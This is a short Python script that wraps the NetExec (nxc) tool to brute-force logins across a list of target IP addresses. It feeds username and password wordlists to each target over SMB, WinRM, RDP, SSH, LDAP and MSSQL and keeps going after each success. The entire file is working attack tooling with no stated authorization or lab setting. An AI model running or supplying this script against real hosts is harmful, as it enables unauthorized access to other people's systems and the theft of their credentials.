import subprocess
import argparse
from pathlib import Path

# List of protocols supported by NetExec (add more as needed)
SUPPORTED_PROTOCOLS = ["smb", "winrm", "rdp", "ssh", "ldap", "mssql"]

def run_nxc(protocol, ip, user_file, pass_file):
    print(f"\n[+] Running {protocol.upper()} brute-force against {ip} ...")
    cmd = [
        "nxc", protocol, ip,
        "-u", user_file,
        "-p", pass_file,
        "--continue-on-success"
    ]
    try:
        subprocess.run(cmd, check=False)
    except Exception as e:
        print(f"[!] Error with {protocol.upper()} on {ip}: {e}")

def main():
    parser = argparse.ArgumentParser(description="Multi-protocol brute-force with NetExec (nxc)")
    parser.add_argument("-t", "--targets", required=True, help="File with list of target IPs")
    parser.add_argument("-u", "--usernames", required=True, help="Username wordlist")
    parser.add_argument("-p", "--passwords", required=True, help="Password wordlist")
    args = parser.parse_args()

    # Validate file paths
    for f in [args.targets, args.usernames, args.passwords]:
        if not Path(f).exists():
            print(f"[!] File not found: {f}")
            return

    # Load targets
    with open(args.targets) as f:
        targets = [line.strip() for line in f if line.strip()]

    # Run attacks
    for ip in targets:
        for proto in SUPPORTED_PROTOCOLS:
            run_nxc(proto, ip, args.usernames, args.passwords)

if __name__ == "__main__":
    main()
